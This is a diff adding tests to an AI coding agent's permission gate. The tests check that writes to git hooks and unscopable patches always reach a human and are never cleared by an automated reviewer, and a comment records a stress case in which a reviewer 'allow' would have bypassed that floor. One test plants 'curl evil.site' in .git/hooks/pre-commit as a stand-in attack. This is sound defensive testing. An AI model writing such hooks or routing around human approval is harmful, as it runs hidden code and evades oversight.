@@ -96,6 +96,22 @@ def test_hard_floors_hold_in_auto_approve(tmp_path):
     assert not d.allowed and not d.needs_user  # hard deny: the reviewer never sees it
 
 
+def test_deferred_execution_files_are_human_only(tmp_path):
+    # Git hooks / CI configs run on a LATER innocuous action — the floor is that a human
+    # sees every such write ("no auto-approve path may clear them"). The decision says so.
+    d = _gate(tmp_path).evaluate(
+        "write_file", {"path": ".git/hooks/pre-commit", "content": "curl evil.site"}
+    )
+    assert not d.allowed and d.needs_user and d.human_only
+    # An unscopable write (no locatable path) is human-only too: an allow would bypass
+    # root scoping unverified.
+    d2 = _gate(tmp_path).evaluate("apply_patch", {"patch": "garbage, no file header"})
+    assert not d2.allowed and d2.needs_user and d2.human_only
+    # An ordinary ask stays reviewer-eligible.
+    d3 = _gate(tmp_path).evaluate("run_shell", {"command": "pytest -q"})
+    assert d3.needs_user and not d3.human_only
+
+
 # -- verdict parsing: no parse path results in execution (§8.5) -------------------
 
 
@@ -171,6 +187,30 @@ def test_replies_are_labelled_reply_and_turn_numbering_skips_them():
     assert lines[0].startswith("  turn 1  fix the tests")
     assert lines[1].startswith("  reply   yes") and "turn" not in lines[1]
     assert lines[2].startswith("  turn 2  update the changelog")  # numbering skipped the reply
+
+
+# -- human-only asks skip the reviewer entirely -------------------------------------
+
+
+def test_reviewer_cannot_clear_a_git_hook_write(tmp_path):
+    # Stress case that found the gap (2026-08-17): the engine used to consult the
+    # reviewer on ANY needs_user decision — including protected in-project files, whose
+    # entire floor is that a PERSON sees them. An "allow" here would have been the
+    # bypass. Now: card always, reviewer never asked.
+    engine, rows, approvals = _engine(
+        tmp_path,
+        [
+            _tool_turn(("write_file", {"path": ".git/hooks/pre-commit", "content": "x"})),
+            AssistantTurn(text="done", finish_reason="stop"),
+        ],
+    )
+    engine.reviewer = _FakeReviewer({"write_file": "allow"})  # eager to allow — must not matter
+    events = _run(engine, "update the changelog")
+
+    assert approvals == ["write_file"]  # the human saw the card
+    assert EventType.PERMISSION_REQUIRED in [ev.type for ev in events]
+    assert engine.reviewer.asked == []  # the reviewer was never consulted
+    assert [r for r in rows if r.get("stage") == "reviewer_verdict"] == []
 
 
 # -- attachments never reach the reviewer's request (§4.4) --------------------------
